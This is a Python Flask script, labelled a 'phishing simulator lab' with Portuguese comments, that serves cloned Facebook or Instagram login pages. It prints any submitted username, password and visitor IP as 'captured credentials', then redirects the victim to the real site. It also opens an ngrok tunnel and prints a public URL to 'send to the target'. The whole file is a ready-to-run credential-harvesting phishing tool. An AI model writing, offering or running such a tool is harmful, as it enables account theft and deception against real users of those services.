import os
from flask import Flask, render_template, request, redirect
from pyngrok import ngrok
from colorama import Fore, Style, init

# Inicializa cores para o terminal
init(autoreset=True)

app = Flask(__name__)

TEMPLATES_DISPONIVEIS = {
    '1': 'facebook',
    '2': 'instagram',
    '3': 'custom' 
}

selected_template = ""

@app.route('/')
def index():
    return render_template(f'{selected_template}/index.html')

@app.route('/login', methods=['POST'])
def login():
    # Captura dos dados enviados pelo formulário
    email = request.form.get('email') or request.form.get('username')
    password = request.form.get('password')
    
    print(f"\n{Fore.RED}[!] CREDENCIAIS CAPTURADAS:")
    print(f"{Fore.YELLOW}Usuário: {Fore.WHITE}{email}")
    print(f"{Fore.YELLOW}Senha:   {Fore.WHITE}{password}")
    print(f"{Fore.CYAN}IP Alvo: {request.remote_addr}\n")

    # Redireciona para o site real após inserção das credenciais
    return redirect(f"https://www.{selected_template}.com")

def start_lab():
    global selected_template
    print(f"{Fore.GREEN}--- PHISHING SIMULATOR LAB ---")
    print("1 - Facebook\n2 - Instagram\n3 - Projeto Próprio (Pasta Custom)")
    
    choice = input(f"{Fore.CYAN}Selecione uma opção: ")
    selected_template = TEMPLATES_DISPONIVEIS.get(choice, 'custom')

    # Configurando o Túnel Ngrok
    print(f"{Fore.YELLOW}[*] Iniciando túnel ngrok...")

    ngrok.set_auth_token("SEU_TOKEN_AQUI")
    public_url = ngrok.connect(5000).public_url
    
    print(f"\n{Fore.GREEN}[+] URL PÚBLICA ENVIAR AO ALVO: {Fore.WHITE}{public_url}")
    print(f"{Fore.MAGENTA}[*] Monitorando logs no terminal...\n")

    app.run(port=5000, debug=False)

if __name__ == '__main__':
    start_lab()